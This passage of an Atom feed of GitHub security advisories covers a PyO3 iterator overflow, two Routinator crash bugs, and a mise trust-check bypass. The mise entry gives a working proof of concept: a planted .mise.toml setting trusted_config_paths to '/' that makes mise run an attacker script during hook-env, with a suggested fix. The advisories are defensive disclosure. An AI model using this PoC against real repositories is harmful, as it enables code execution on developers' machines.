<p>In <code>nth</code> methods, a sufficiently large <code>n</code> (combined with a non-zero internal index) could cause the addition to overflow and wrap around, producing a small "target index" that passed the bounds check and enabling reads at the front of the <code>list</code> or <code>tuple</code> of elements previously yielded by the iterator.</p>
<p>In <code>nth_back</code> methods, a sufficiently large <code>n</code> could cause underflow in a similar fashion, however would instead allow reads of arbitrary memory past the end of the <code>list</code> or <code>tuple</code> storage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PyO3/pyo3/pull/6086">https://github.com/PyO3/pyo3/pull/6086</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0176.html">https://rustsec.org/advisories/RUSTSEC-2026-0176.html</a></li>
<li><a href="https://github.com/advisories/GHSA-36hh-v3qg-5jq4">https://github.com/advisories/GHSA-36hh-v3qg-5jq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-36hh-v3qg-5jq4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-12T19:32:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mise] Local settings bypass config trust checks]]></title>
        <id>https://github.com/advisories/GHSA-436v-8fw5-4mj8</id>
        <link href="https://github.com/advisories/GHSA-436v-8fw5-4mj8"/>
        <updated>2026-06-12T19:30:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>mise</code> loads trust-control settings from a local project <code>.mise.toml</code> before the trust check runs. An attacker who can place a malicious <code>.mise.toml</code> in a repository can make that same file appear trusted and then reach dangerous directives such as <code>[env] _.source</code>, templates, hooks, or tasks.</p>
<p>The strongest current variant is <code>trusted_config_paths = ["/"]</code>. I confirmed on current <code>v2026.3.17</code> in Docker that this causes an untrusted project config to become trusted during <code>mise hook-env</code>, which then executes an attacker-controlled <code>_.source</code> script. The same preload issue also lets local <code>yes = true</code> / <code>ci = true</code> auto-approve trust prompts on <code>v2026.2.18+</code>, but the primary PoC below uses the stronger <code>trusted_config_paths</code> path.</p>
<h3 id="details">Details</h3>
<p>The vulnerable load order is:</p>
<ol>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L254-L283"><code>Settings::try_get()</code></a> preloads local settings files.</li>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L505-L510"><code>parse_settings_file()</code></a> returns <code>settings_file.settings</code> without checking whether the file is trusted.</li>
<li><a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/config_file/mod.rs#L297-L321"><code>trust_check()</code></a> later consults those already-loaded settings.</li>
</ol>
<p>The main trust-bypass path is in <a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/config_file/mod.rs#L324-L387"><code>is_trusted()</code></a>:</p>
<pre><code class="language-rust">let settings = Settings::get();
for p in settings.trusted_config_paths() {
    if canonicalized_path.starts_with(p) {
        add_trusted(canonicalized_path.to_path_buf());
        return true;
    }
}
</code></pre>
<p>If a local project file sets:</p>
<pre><code class="language-toml">[settings]
trusted_config_paths = ["/"]
</code></pre>
<p>then every absolute path matches, so the same untrusted file is marked trusted before the dangerous-directive guard is reached.</p>
<p>Related variant: <a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/config_file/mod.rs#L307-L316"><code>trust_check()</code></a> auto-accepts explicit trust prompts when <code>Settings::get().yes</code> is true, and <a href="https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L330-L332"><code>Settings::try_get()</code></a> sets <code>yes = true</code> when <code>ci</code> is set. I confirmed that regression on <code>v2026.2.18</code>, but the primary PoC below does not depend on it.</p>
<h3 id="poc">PoC</h3>
<p>Test environment:</p>
<ul>
<li>Docker</li>
<li><code>linux-arm64</code></li>
<li><code>mise v2026.3.17</code></li>
</ul>
<p>Negative control:</p>
<pre><code class="language-toml">[env]
_.source = ["./poc.sh"]
</code></pre>
<p><code>mise ls</code> fails with:</p>
<pre><code class="language-text">Config files in /work/poc/.mise.toml are not trusted.
</code></pre>
<p>and <code>/tmp/mise-proof.txt</code> is not created.</p>
<p>Primary exploit:</p>
<pre><code class="language-toml">[settings]
trusted_config_paths = ["/"]

[env]
_.source = ["./poc.sh"]
</code></pre>
<p>with:</p>
<pre><code class="language-bash">#!/usr/bin/env bash
echo trusted_paths_hookenv &gt; /tmp/mise-proof.txt
</code></pre>
<p>Then:</p>
<pre><code class="language-bash">mise hook-env -s bash --force
</code></pre>
<p>Observed:</p>
<pre><code class="language-text">/tmp/mise-proof.txt =&gt; trusted_paths_hookenv
</code></pre>
<p>Related regression check:</p>
<ul>
<li><code>v2026.2.17</code>: local <code>yes = true</code> does not bypass trust</li>
<li><code>v2026.2.18</code>: the same local <code>yes = true</code> value auto-approves the trust prompt and the side effect file is created</li>
</ul>
<h3 id="impact">Impact</h3>
<p>An attacker who can place a <code>.mise.toml</code> in a repository can make <code>mise</code> trust and evaluate dangerous directives from that same untrusted file.</p>
<p>Demonstrated on current supported versions:</p>
<ul>
<li>execution via <code>[env] _.source</code> during <code>mise hook-env</code></li>
<li>bypass of the protection that <code>mise trust</code> is supposed to provide for dangerous config features</li>
</ul>
<p>On newer versions, the same root cause also lets local <code>yes</code> / <code>ci</code> values auto-approve explicit trust prompts.</p>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Do not honor trust-control settings from non-global project config files.</p>
<p>At minimum, ignore these fields when loading local project config:</p>
<ul>
<li><code>trusted_config_paths</code></li>
<li><code>yes</code></li>
<li><code>ci</code></li>
<li><code>paranoid</code></li>
</ul>
<p>For example:</p>
<pre><code class="language-rust">pub fn parse_settings_file(path: &amp;Path) -&gt; Result&lt;SettingsPartial&gt; {
    let raw = file::read_to_string(path)?;
    let settings_file: SettingsFile = toml::from_str(&amp;raw)?;
    let mut settings = settings_file.settings;

    if !config::is_global_config(path) {
        settings.yes = None;
        settings.ci = None;
        settings.trusted_config_paths = None;
        settings.paranoid = None;
    }

    Ok(settings)
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jdx/mise/security/advisories/GHSA-436v-8fw5-4mj8">https://github.com/jdx/mise/security/advisories/GHSA-436v-8fw5-4mj8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35533">https://nvd.nist.gov/vuln/detail/CVE-2026-35533</a></li>
<li><a href="https://github.com/advisories/GHSA-436v-8fw5-4mj8">https://github.com/advisories/GHSA-436v-8fw5-4mj8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-436v-8fw5-4mj8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T20:13:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[routinator] Routinator crashes when sending a maliciously crafted select-asn query parameter]]></title>
        <id>https://github.com/advisories/GHSA-gc6q-cwcj-3vh9</id>
        <link href="https://github.com/advisories/GHSA-gc6q-cwcj-3vh9"/>
        <updated>2026-06-12T19:06:22.000Z</updated>
        <content type="html"><![CDATA[<p>When sending a specifically crafted non-UTF-8 string as select-asn query parameter to the /api/v1/origins endpoint, Routinator crashes. </p>
<p>This only affects users who allow API access from untrusted networks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49234">https://nvd.nist.gov/vuln/detail/CVE-2026-49234</a></li>
<li><a href="https://www.nlnetlabs.nl/downloads/routinator/CVE-2026-49234.txt">https://www.nlnetlabs.nl/downloads/routinator/CVE-2026-49234.txt</a></li>
<li><a href="https://github.com/NLnetLabs/routinator/releases/tag/v0.15.2">https://github.com/NLnetLabs/routinator/releases/tag/v0.15.2</a></li>
<li><a href="https://github.com/advisories/GHSA-gc6q-cwcj-3vh9">https://github.com/advisories/GHSA-gc6q-cwcj-3vh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc6q-cwcj-3vh9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-08T15:33:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[routinator] Routinator crashes when encountering maliciously crafted RRDP XML files]]></title>
        <id>https://github.com/advisories/GHSA-5qf9-cf9c-hjc6</id>
        <link href="https://github.com/advisories/GHSA-5qf9-cf9c-hjc6"/>
        <updated>2026-06-12T19:06:17.000Z</updated>
        <content type="html"><![CDATA[<p>When Routinator encounters a file via RRDP using a specifically crafted Document Type Definition, Routinator crashes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49235">https://nvd.nist.gov/vuln/detail/CVE-2026-49235</a></li>
<li><a href="https://www.nlnetlabs.nl/downloads/routinator/CVE-2026-49235.txt">https://www.nlnetlabs.nl/downloads/routinator/CVE-2026-49235.txt</a></li>
<li><a href="https://github.com/NLnetLabs/routinator/releases/tag/v0.15.2">https://github.com/NLnetLabs/routinator/releases/tag/v0.15.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5qf9-cf9c-hjc6">https://github.com/advisories/GHSA-5qf9-cf9c-hjc6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5qf9-cf9c-hjc6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-08T15:33:00.000Z</published>
    </entry>
</feed>